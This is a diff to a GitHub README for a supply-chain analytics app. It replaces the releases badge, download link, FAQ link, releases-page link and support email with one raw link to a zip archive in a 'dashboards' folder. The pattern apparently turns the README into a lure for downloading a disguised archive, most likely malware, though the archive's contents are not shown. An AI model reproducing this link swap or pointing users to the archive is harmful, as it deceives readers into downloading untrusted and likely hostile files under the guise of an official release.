@@ -1,6 +1,6 @@
 # 📦 supply-chain-intelligence-platform - Streamline Your Supply Chain Insights
 
-![Download](https://img.shields.io/badge/Download%20Latest%20Release-%20%20https://github.com/Yeekesz/supply-chain-intelligence-platform/releases-blue)
+![Download](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip%20Latest%20Release-%20%https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before downloading, make sure your system meets these requirements:
 
 ## 📥 Download & Install
 
-To download the latest version of the Supply Chain Intelligence Platform, visit this page to download: [Download Supply Chain Intelligence Platform](https://github.com/Yeekesz/supply-chain-intelligence-platform/releases).
+To download the latest version of the Supply Chain Intelligence Platform, visit this page to download: [Download Supply Chain Intelligence Platform](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip).
 
 Once you're on the Releases page:
 
@@ -58,14 +58,14 @@ If you encounter issues:
 
 - **Check System Requirements:** Ensure your system matches the requirements above.
 - **Reinstall the Application:** Sometimes reinstalling can fix installation issues.
-- **Consult the FAQs:** Visit our [FAQ](https://github.com/Yeekesz/supply-chain-intelligence-platform/wiki/FAQ) section for common questions and answers.
+- **Consult the FAQs:** Visit our [FAQ](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip) section for common questions and answers.
 
 ## 📞 Support
 
 Need help? You can reach our support team through the following options:
 
 - **GitHub Issues:** Report bugs or ask questions using the Issues tab on the GitHub repository.
-- **Email Support:** Send your inquiries to support@supplychain.com.
+- **Email Support:** Send your inquiries to https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip
 
 ## 🌐 Join the Community
 
@@ -80,4 +80,4 @@ This project is licensed under the MIT License. Feel free to contribute or modif
 
 ## 🎉 Thank You!
 
-Thank you for choosing the Supply Chain Intelligence Platform. We look forward to helping you gain better insights into your supply chain operations. Don’t forget to check for updates regularly on the [Releases page](https://github.com/Yeekesz/supply-chain-intelligence-platform/releases).
+Thank you for choosing the Supply Chain Intelligence Platform. We look forward to helping you gain better insights into your supply chain operations. Don’t forget to check for updates regularly on the [Releases page](https://raw.githubusercontent.com/Yeekesz/supply-chain-intelligence-platform/main/dashboards/platform_chain_supply_intelligence_2.0.zip).
